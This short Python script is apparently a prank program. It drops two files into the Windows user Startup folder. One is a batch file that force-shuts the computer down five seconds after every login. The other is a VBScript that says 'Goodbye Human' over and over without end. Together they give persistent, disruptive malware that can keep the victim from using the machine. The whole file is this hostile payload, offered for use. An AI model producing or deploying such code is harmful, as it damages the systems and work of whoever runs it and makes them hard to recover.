import os # very good and powerful library

# find startup folder
startup_folder = os.path.join(
    os.environ["APPDATA"],
    r"Microsoft\Windows\Start Menu\Programs\Startup"
)

# add startup folder path to file names
shutdown_path = os.path.join(startup_folder, "shutdown.bat")
voice_path = os.path.join(startup_folder, "voice.vbs")

# shut down the system
shutdown_content = "@echo off\n" \
                   "echo Your system will die in 5 seconds...\n" \
                   "shutdown /s /t 5 /f\n"

# a voice message
voice_content = "Set S = CreateObject(\"SAPI.SpVoice\")\n" \
                "do\n" \
                "S.Speak \"Goodbye Human\"\n" \
                "loop"

# write contents in files
with open(shutdown_path, "w") as file:
    file.write(shutdown_content)

with open(voice_path, "w") as file:
    file.write(voice_content)
